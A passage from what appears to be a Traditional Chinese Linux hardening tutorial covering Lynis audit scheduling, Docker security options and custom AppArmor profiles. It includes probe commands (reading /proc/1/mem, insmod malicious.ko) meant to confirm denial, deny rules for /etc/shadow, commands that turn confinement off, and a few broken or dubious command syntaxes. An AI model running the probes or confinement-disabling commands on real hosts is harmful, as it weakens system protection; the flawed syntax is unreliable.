        echo "安全掃描發現問題 - $(date)"
        echo "詳細報告請查看：$REPORT_DIR/lynis-$DATE.log"
        echo ""
        echo "主要問題："
        grep "WARNING\|ERROR" $REPORT_DIR/lynis-$DATE.log
    } | mail -s "安全掃描警報 - $(hostname)" $ADMIN_EMAIL
fi

# 清理舊報告（保留30天）
find $REPORT_DIR -name "*.log" -mtime +30 -delete
find $REPORT_DIR -name "*.dat" -mtime +30 -delete
```

#### 2. 設定 Crontab
```bash
sudo crontab -e

# 每日 3AM 執行安全掃描
0 3 * * * /usr/local/bin/security-audit.sh

# 每週日執行完整掃描
0 2 * * 0 /usr/bin/lynis audit system --report-file /var/log/weekly-security-audit.log
```

---

## 3. Docker 安全選項詳解

### `docker run --security-opt apparmor:docker-default nginx` 解釋

#### 基本語法結構
```bash
docker run \
  --security-opt apparmor:docker-default \  # AppArmor 安全選項
  nginx                                      # 容器映像
```

#### 各部分詳細說明

**`--security-opt`**: Docker 安全選項參數
- 用於配置容器的安全框架
- 可以設定 AppArmor、SELinux、seccomp 等

**`apparmor:docker-default`**: 指定 AppArmor 配置
- `apparmor`: 指定使用 AppArmor 安全框架
- `docker-default`: 使用 Docker 預設的 AppArmor 配置檔

### Docker AppArmor 配置檔案

#### 查看 Docker 預設 AppArmor 配置
```bash
# 檢查 Docker 預設的 AppArmor 配置
sudo cat /etc/apparmor.d/docker-default

# 或者檢查已載入的配置
sudo aa-status | grep docker
```

**docker-default 配置檔範例：**
```bash
#include <tunables/global>

profile docker-default flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # 網路權限
  network inet tcp,
  network inet udp,
  network inet icmp,

  # 檔案系統權限
  file,
  
  # 限制系統目錄存取
  deny @{PROC}/* w,           # 禁止寫入 /proc
  deny @{PROC}/[0-9]*/mem r,  # 禁止讀取進程記憶體
  deny @{PROC}/kmem r,        # 禁止讀取核心記憶體
  deny @{PROC}/kcore r,       # 禁止讀取核心 core
  
  # 限制系統呼叫
  deny mount,                 # 禁止掛載
  deny /sys/[^f]*/** wklx,    # 限制 /sys 寫入
  deny /sys/f[^s]*/** wklx,   # 限制特定 /sys 目錄
  
  # 允許必要的能力
  capability chown,
  capability dac_override,
  capability fowner,
  capability fsetid,
  capability kill,
  capability setgid,
  capability setuid,
  capability setpcap,
  capability net_bind_service,
  capability net_raw,
  capability sys_chroot,
  
  # 禁止危險的能力
  deny capability sys_admin,      # 禁止系統管理
  deny capability sys_module,     # 禁止載入核心模組
  deny capability sys_rawio,      # 禁止原始 I/O
  deny capability sys_boot,       # 禁止重開機
  deny capability mac_admin,      # 禁止 MAC 管理
  deny capability mac_override,   # 禁止覆蓋 MAC
}
```

### 其他 Docker 安全選項

#### 1. 不同的 AppArmor 配置
```bash
# 使用自訂 AppArmor 配置檔
docker run --security-opt apparmor:my-custom-profile nginx

# 停用 AppArmor (不建議)
docker run --security-opt apparmor:unconfined nginx

# 使用系統的 AppArmor 配置
docker run --security-opt apparmor:/usr/sbin/nginx nginx
```

#### 2. SELinux 安全選項
```bash
# 在 SELinux 系統上使用
docker run --security-opt label:type:container_t nginx

# 停用 SELinux (不建議)
docker run --security-opt label:disable nginx

# 設定 SELinux 用戶和角色
docker run --security-opt label:user:system_u --security-opt label:role:system_r nginx
```

#### 3. Seccomp 安全選項
```bash
# 使用預設 seccomp 配置檔
docker run --security-opt seccomp=default nginx

# 使用自訂 seccomp 配置檔
docker run --security-opt seccomp:/path/to/seccomp.json nginx

# 停用 seccomp (非常危險)
docker run --security-opt seccomp=unconfined nginx
```

#### 4. 組合多種安全選項
```bash
# 同時使用多種安全框架
docker run \
  --security-opt apparmor:docker-default \
  --security-opt seccomp=default \
  --security-opt no-new-privileges:true \
  nginx
```

### 驗證安全選項效果

#### 1. 檢查容器的安全配置
```bash
# 啟動容器
docker run -d --name test-nginx --security-opt apparmor:docker-default nginx

# 檢查容器程序的 AppArmor 配置
docker exec test-nginx cat /proc/self/attr/current
# 輸出：docker-default (enforce)

# 檢查容器的安全資訊
docker inspect test-nginx | grep -A 10 SecurityOpt
```

#### 2. 測試安全限制
```bash
# 進入容器測試
docker exec -it test-nginx bash

# 嘗試存取被限制的資源
cat /proc/1/mem          # 應該被拒絕
mount /dev/sda1 /mnt     # 應該被拒絕
insmod malicious.ko      # 應該被拒絕

# 檢查 AppArmor 日誌
sudo grep DENIED /var/log/syslog | grep docker-default
```

### Docker 安全最佳實務

#### 1. 預設安全配置
```bash
# 建立安全的容器啟動腳本
#!/bin/bash
# secure-docker-run.sh

CONTAINER_NAME=$1
IMAGE=$2

docker run -d \
  --name $CONTAINER_NAME \
  --security-opt apparmor:docker-default \
  --security-opt seccomp=default \
  --security-opt no-new-privileges:true \
  --read-only \                              # 唯讀檔案系統
  --tmpfs /tmp \                             # 暫存目錄
  --tmpfs /var/run \                         # 執行目錄
  --user 1000:1000 \                        # 非 root 用戶
  --cap-drop ALL \                           # 移除所有能力
  --cap-add CHOWN \                          # 只添加必要能力
  --cap-add SETGID \
  --cap-add SETUID \
  $IMAGE
```

#### 2. Docker Compose 安全配置
```yaml
# docker-compose.yml
version: '3.8'
services:
  web:
    image: nginx
    security_opt:
      - apparmor:docker-default
      - seccomp:default
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp
      - /var/run
    user: "1000:1000"
    cap_drop:
      - ALL
    cap_add:
      - CHOWN
      - SETGID
      - SETUID
```

#### 3. 自訂 AppArmor 配置
```bash
# 建立自訂的容器 AppArmor 配置
sudo nano /etc/apparmor.d/docker-nginx

# 內容：
#include <tunables/global>

profile docker-nginx flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  #include <abstractions/web-data>

  # 只允許存取網頁目錄
  /var/www/html/** r,
  /etc/nginx/** r,
  /var/log/nginx/** w,
  
  # 禁止其他目錄存取
  deny /etc/passwd r,
  deny /etc/shadow r,
  deny /home/** rwx,
  deny /root/** rwx,
  
  # 網路權限
  network inet stream,
  deny network raw,
  
  # 限制系統呼叫
  deny capability sys_admin,
  deny mount,
}

# 載入配置
sudo apparmor_parser -r /etc/apparmor.d/docker-nginx

# 使用自訂配置
docker run --security-opt apparmor:docker-nginx nginx
```

### 監控和除錯

#### 1. 監控安全事件
```bash
# 監控 AppArmor 拒絕事件
sudo tail -f /var/log/syslog | grep "apparmor.*DENIED"

# 監控容器安全事件
sudo ausearch -m avc -ts recent | grep docker

# 使用 Docker 事件監控
docker events --filter event=create --filter event=start
```

#### 2. 除錯安全問題
```bash
# 暫時設定為 complain 模式進行除錯
sudo aa-complain docker-default

# 重新執行容器並觀察日誌
docker run --security-opt apparmor:docker-default nginx

# 分析並調整策略後，重新設為 enforce 模式
sudo aa-enforce docker-default
```

## 總結

**AIDE** - 檔案完整性監控
- 建立檔案系統基準線
- 定期檢查未授權變更
- 適合偵測入侵和系統竄改

**Lynis** - 系統安全審計
- 全面的安全配置檢查
- 提供具體的改善建議
- 適合定期安全評估

**Docker Security Options** - 容器安全強化
- 利用宿主機的安全框架
- 限制容器的系統存取權限
- 提供縱深防禦機制

這三個工具組合使用，可以建立完整的系統安全監控和防護體系：
1. **預防**：Docker 安全選項限制容器權限
2. **檢測**：AIDE 監控檔案變更
3. **評估**：Lynis 定期安全審計









